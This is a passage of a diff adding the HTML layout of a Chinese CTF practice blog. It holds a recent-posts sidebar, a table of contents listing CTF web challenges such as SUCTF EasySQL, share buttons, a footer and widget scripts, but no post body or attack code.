+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="https://xiaochai-123.github.io/images/SQL.png" loading="lazy"
+     width="1546"
+     height="699"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+        SQLi-labs靶场搭建
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 22, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="https://xiaochai-123.github.io/images/SQL1.png" loading="lazy"
+     width="474"
+     height="240"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/sqli-labs/">
+        SQL注入——sqli-labs学习笔记
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 22, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/bkcrack%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
+        bkcrack的使用方法
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 17, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="https://xiaochai-123.github.io/images/1.png" loading="lazy"
+     width="2400"
+     height="1350"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/ctf-web-guide/">
+        [持续更新] CTF-Web Guide
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 17, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="双重md5爆破" src="https://xiaochai-123.github.io/images/MD5.png" loading="lazy"
+     width="626"
+     height="251"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E5%8F%8C%E9%87%8Dmd5%E7%88%86%E7%A0%B4/">
+        双重md5爆破
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 5, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        Contents
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#afctf-2021baby_csp">[AFCTF 2021]BABY_CSP</a></li>
+    <li><a href="#gxyctf-2019babyupload">[GXYCTF 2019]BabyUpload</a></li>
+    <li><a href="#suctf-2019easysql">[SUCTF 2019]EasySQL</a></li>
+    <li><a href="#你的现象">你的现象</a></li>
+    <li><a href="#为什么">为什么？</a>
+      <ul>
+        <li><a href="#1-输入-1">1. 输入 <code>1</code></a></li>
+        <li><a href="#2-输入-">2. 输入 <code>*</code></a></li>
+        <li><a href="#3-输入-1">3. 输入 <code>*,1</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#可能的php后端逻辑">可能的PHP后端逻辑</a>
+      <ul>
+        <li><a href="#方案一数组长度判断">方案一：数组长度判断</a></li>
+        <li><a href="#方案二只输出数字型下标">方案二：只输出数字型下标</a></li>
+        <li><a href="#方案三某种特殊模板导致只有常量列默认输出">方案三：某种特殊模板导致只有常量列默认输出</a></li>
+      </ul>
+    </li>
+    <li><a href="#为什么输入1会有回显">为什么输入1会有回显</a></li>
+    <li><a href="#总结分析">总结分析</a>
+      <ul>
+        <li><a href="#一句话总结">一句话总结</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      Actions
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="social-share mb-4 d-flex overflow-auto">
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="X Share Button"
+      target="_blank" href="https://x.com/intent/tweet?title=251129%e6%af%8f%e6%97%a5%e6%89%93%e5%8d%a1&url=https%3a%2f%2fxiaochai-123.github.io%2fposts%2f251129%2f">
+        <i class="fab fa-2x fa-fw fa-x-twitter mb-2"></i> X
+      </a>
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Facebook Share Button"
+        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fxiaochai-123.github.io%2fposts%2f251129%2f">
+        <i class="fab fa-2x fa-fw fa-facebook-f mb-2"></i> Facebook
+      </a>
+    </div>
+    <hr class="mb-4"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> Go back
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL
+      </a>
+  </div>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">xiaochai_123的小窝</p>
+    <p class="text-secondary mb-2"><small>Welcome to xiaochai_123’s Blog! I look forward to sharing this great journey with you.</small></p>© 2025 xiaochai-123. 欢迎转载但请注明出处 | 本博客内容版权所有
+    <div class="footer-line visitor" style="margin: 0.5em 0;">
+      <span id="busuanzi_container_site_uv" title="总访客数" style="display: inline;">
+        👤 总访客数 <span id="busuanzi_value_site_uv">...</span>
+      </span>
+      <span id="busuanzi_container_site_pv" class="footer-divider" title="总访问量" style="display: inline; margin-left: 1em;">
+        👁️ 总访问量 <span id="busuanzi_value_site_pv">...</span>
+      </span>
+    </div>
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+    <a class="nav-link social-link p-0 me-1 mb-2" href="mailto:mailto:l2556843965@163.com" title="Email">
+      <i class="fas fa-fw fa-2x fa-envelope" style="color: #0963ac;"></i>
+    </a>
+      <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" href="https://github.com/xiaochai-123" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://xiaochai-123.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+<script src="/js/copy-code.js"></script>
+<link rel="stylesheet" href="/css/copy-code.css">
+</footer>
+<script data-precache src="/assets/main/bundle.min.5f7fecfd2a8f9951e8efea436dc08e86e678d38ab9eeb343e3d1324d57f3f64a.js" integrity="sha256-X3/s/SqPmVHo7&#43;pDbcCOhuZ404q57rND49EyTVfz9ko=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
+<script src="https://giscus.app/client.js"
+    data-repo="xiaochai-123/xiaochai-123.github.io"
+    data-repo-id="R_kgDOQcBRNA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOQcBRNM4Cy98G"
+    data-mapping="pathname"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    defer>
+</script>
+
+
+  </body>
+</html>
